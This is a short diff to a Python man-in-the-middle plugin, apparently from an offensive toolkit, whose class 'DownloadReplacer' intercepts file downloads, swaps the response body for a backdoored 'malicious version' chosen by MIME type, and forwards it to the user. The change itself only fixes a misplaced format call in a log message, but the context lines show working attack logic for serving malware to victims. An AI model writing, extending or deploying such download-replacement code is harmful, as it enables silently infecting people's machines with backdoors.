@@ -40,7 +40,7 @@ class DownloadReplacer(MITMPlugin):
 						ctx.log.info(('[{}]:: URL: {}'.format(self.name, flow.request.url)))
 						flow.response.content = open(self.backdoors[content],'rb').read()
 						ctx.log.info("[{}]:: Replaced file of mimtype {} with malicious version".format(self.name, content))
-						ctx.log.info('[{}]:: Replacement complete, forwarding to user...').format(self.name)
+						ctx.log.info('[{}]:: Replacement complete, forwarding to user...'.format(self.name))
 					return 
 				ctx.log.info('[{}]:: {}, Error Path file not found\n'.format(self.name, self.backdoors[content]))
 		except Exception as e:
